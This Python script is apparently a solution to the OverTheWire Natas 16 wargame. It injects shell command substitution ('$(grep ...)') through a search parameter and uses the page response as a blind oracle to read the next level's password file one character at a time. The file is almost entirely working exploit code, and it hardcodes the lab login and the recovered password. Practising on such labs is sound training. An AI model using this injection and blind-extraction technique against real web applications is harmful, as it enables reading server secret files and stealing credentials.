import requests

length = 32
characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
url = 'http://natas16.natas.labs.overthewire.org/index.php'
good_text = 'hacker'
present_chars = ''

for i in range(62) :
	query = '?needle=$(grep '+ characters[i] +' /etc/natas_webpass/natas17)hacker&submit=Search'
	print("[+] Trying [query : ",end="")
	print(query,end="")
	x = requests.get(url+query, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
	if good_text in x.text : 
		print(" ]   [-] False")
	else :
		present_chars += characters[i]
		print(" ]   [+] True")

print(present_chars)
print(len(present_chars))
password = ''

for i in range(32) :
	for j in range(26) : 
		query = '?needle=$(grep ^'+ password + present_chars[j] +' /etc/natas_webpass/natas17)hacker&submit=Search'
		print("[+] Trying [query : ",end="")
		print(query,end="")
		x = requests.get(url+query, auth=('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
		if good_text in x.text : 
			print(" ]   [-] False")
		else :
			password += present_chars[j]
			print(" ]   [+] True")
			break;

print(password)
print(len(password))

# 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw